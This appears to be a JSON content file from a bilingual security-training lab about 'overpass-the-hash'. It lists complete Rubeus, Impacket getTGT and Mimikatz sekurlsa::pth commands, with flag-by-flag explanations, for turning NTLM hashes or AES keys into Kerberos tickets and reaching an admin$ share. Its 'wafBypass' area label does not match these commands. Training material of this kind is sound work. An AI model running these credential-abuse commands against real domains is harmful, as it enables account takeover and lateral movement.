  {
   "id": "overpass-the-hash",
   "patches": [
    {
     "area": "wafBypass",
     "index": 0,
     "expectedCommand": "Rubeus.exe asktgt /user:{LAB_USER} /domain:{LAB_DOMAIN} /aes256:{LAB_AES256_KEY} /ptt /nowrap",
     "syntaxBreakdown": [
      {
       "part": "Rubeus.exe asktgt",
       "explanation": {
        "zh": "申请TGT",
        "en": "request a TGT"
       },
       "type": "function"
      },
      {
       "part": "/aes256:{LAB_AES256_KEY}",
       "explanation": {
        "zh": "AES256密钥请求",
        "en": "request via AES256"
       },
       "type": "flag"
      },
      {
       "part": "/ptt",
       "explanation": {
        "zh": "票据直接注入",
        "en": "inject ticket directly"
       },
       "type": "flag"
      },
      {
       "part": "/nowrap",
       "explanation": {
        "zh": "单行输出票据",
        "en": "print ticket unwrapped"
       },
       "type": "flag"
      }
     ]
    },
    {
     "area": "wafBypass",
     "index": 1,
     "expectedCommand": "getTGT.py -aesKey {LAB_AES256_KEY} -dc-ip {DC_HOST} {LAB_DOMAIN}/{LAB_USER}",
     "syntaxBreakdown": [
      {
       "part": "getTGT.py",
       "explanation": {
        "zh": "Impacket取票工具",
        "en": "Impacket TGT tool"
       },
       "type": "function"
      },
      {
       "part": "-aesKey",
       "explanation": {
        "zh": "AES密钥认证",
        "en": "AES key authentication"
       },
       "type": "flag"
      },
      {
       "part": "-dc-ip {DC_HOST}",
       "explanation": {
        "zh": "指定域控",
        "en": "specify the DC"
       },
       "type": "flag"
      },
      {
       "part": "{LAB_DOMAIN}/{LAB_USER}",
       "explanation": {
        "zh": "目标域账号",
        "en": "target domain account"
       },
       "type": "value"
      }
     ]
    },
    {
     "area": "wafBypass",
     "index": 2,
     "expectedCommand": "getTGT.py -aesKey {LAB_AES256_KEY} -dc-ip {DC_HOST} {LAB_DOMAIN}/{LAB_USER} && export KRB5CCNAME={LAB_USER}.ccache && klist && smbclient //{LAB_HOST}/admin$ -k -no-pass",
     "syntaxBreakdown": [
      {
       "part": "export KRB5CCNAME=",
       "explanation": {
        "zh": "设置票据环境变量",
        "en": "set ticket env var"
       },
       "type": "function"
      },
      {
       "part": "klist",
       "explanation": {
        "zh": "查看票据缓存",
        "en": "list ticket cache"
       },
       "type": "function"
      },
      {
       "part": "smbclient //{LAB_HOST}/admin$",
       "explanation": {
        "zh": "访问管理共享",
        "en": "access admin share"
       },
       "type": "value"
      },
      {
       "part": "-k",
       "explanation": {
        "zh": "Kerberos认证",
        "en": "Kerberos auth"
       },
       "type": "flag"
      },
      {
       "part": "-no-pass",
       "explanation": {
        "zh": "免口令登录",
        "en": "no password prompt"
       },
       "type": "flag"
      }
     ],
     "command": "getTGT.py -aesKey {LAB_AES256_KEY} -dc-ip {DC_HOST} {LAB_DOMAIN}/{LAB_USER} && export KRB5CCNAME={LAB_USER}.ccache && klist && smbclient //{LAB_HOST}/admin$ -k -no-pass"
    },
    {
     "area": "execution",
     "index": 0,
     "expectedCommand": "sekurlsa::pth /user:{LAB_USER} /domain:{LAB_DOMAIN} /ntlm:{LAB_NTLM_HASH} /ptt",
     "command": "sekurlsa::pth /user:{LAB_USER} /domain:{LAB_DOMAIN} /ntlm:{LAB_NTLM_HASH} /ptt",
     "title": {
      "zh": "哈希换取 TGT 注入",
      "en": "NTLM-to-Kerberos Ticket-Boundary Audit Reviewed Command 1"
     }
    },
    {
     "area": "execution",
     "index": 1,
     "expectedCommand": "Rubeus.exe asktgt /user:{LAB_USER} /domain:{LAB_DOMAIN} /rc4:{LAB_NTLM_HASH} /ptt",
     "command": "Rubeus.exe asktgt /user:{LAB_USER} /domain:{LAB_DOMAIN} /rc4:{LAB_NTLM_HASH} /ptt",
     "title": {
      "zh": "Rubeus 申请 TGT 注入",
      "en": "NTLM-to-Kerberos Ticket-Boundary Audit Reviewed Command 2"
     }
    },
    {
     "area": "execution",
     "index": 2,
     "expectedCommand": "getTGT.py {LAB_DOMAIN}/{LAB_USER} -hashes :{LAB_NTLM_HASH}",
     "title": {
      "zh": "getTGT 导出 ccache 票据",
      "en": "NTLM-to-Kerberos Ticket-Boundary Audit Reviewed Command 3"
     }
    }
   ]
